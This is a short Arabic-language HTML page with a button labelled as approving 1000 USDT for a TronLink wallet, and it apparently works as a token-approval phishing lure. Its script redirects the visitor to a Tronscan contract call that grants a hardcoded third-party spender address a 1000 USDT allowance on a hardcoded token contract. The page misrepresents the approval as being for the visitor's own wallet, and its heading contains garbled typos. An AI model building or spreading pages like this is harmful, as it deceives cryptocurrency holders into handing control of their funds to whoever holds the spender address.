<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>موافقة USDT TRC20 على TRON</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 100px;
    }
    button {
      font-size: 20px;
      padding: 10px 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<h1>موافقة 1000 USDT (TRؤؤؤؤؤؤC20) لمحفظة TRONLINL</h1>
<button id="approveBtn">موافقة</button>

<script>
  const usdtContractAddress = 'TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn';
  const spenderAddress = 'TWNvNo7d79eQ8VtZUeBoLjtyPYrYn6yXJf';
  const amount = 1000 * 1_000_000; // 1000 USDT (6 أرقام عشرية)

  const approveBtn = document.getElementById('approveBtn');

  approveBtn.addEventListener('click', () => {
    const params = encodeURIComponent(`${spenderAddress},${amount}`);
    const url = `https://tronscan.org/#/contract-call?contract=${usdtContractAddress}&function=approve&parameter=${params}&network=mainnet`;

    window.location.href = url;
  });
</script>

</body>
</html>
